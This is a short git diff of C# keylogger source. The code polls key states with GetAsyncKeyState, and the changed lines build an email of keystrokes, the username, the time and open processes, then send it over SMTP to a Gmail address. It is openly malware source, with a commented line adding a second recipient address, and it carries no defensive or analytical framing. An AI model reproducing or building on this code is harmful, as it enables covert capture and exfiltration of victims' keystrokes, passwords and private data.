@@ -28,7 +28,7 @@ namespace test1
 
             while (true)
             {
-                Thread.Sleep(5);
+                //Thread.Sleep(5);
                 for (int i = 32; i < 127; i++)
                 {
                     int keyState = GetAsyncKeyState(i);
@@ -77,7 +77,8 @@ namespace test1
             {
                 emailBody += "\nAddress: " + address;
             }
-            emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
+            //emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
+            emailBody += "\n User: " + Environment.UserName;
             emailBody += "\n Time: " + now.ToString();
             emailBody += "\n Open apps: " + processes;
             emailBody += "\n Keys pressed: " + logContents;
@@ -87,6 +88,7 @@ namespace test1
 
             mailMessage.From = new MailAddress("testkeyloggerapp@gmail.com");
             mailMessage.To.Add("testkeyloggerapp@gmail.com");
+            //mailMessage.To.Add("ionescumarius1600@gmail.com");
             mailMessage.Subject = subject;
             client.UseDefaultCredentials = false;
             client.EnableSsl = true;
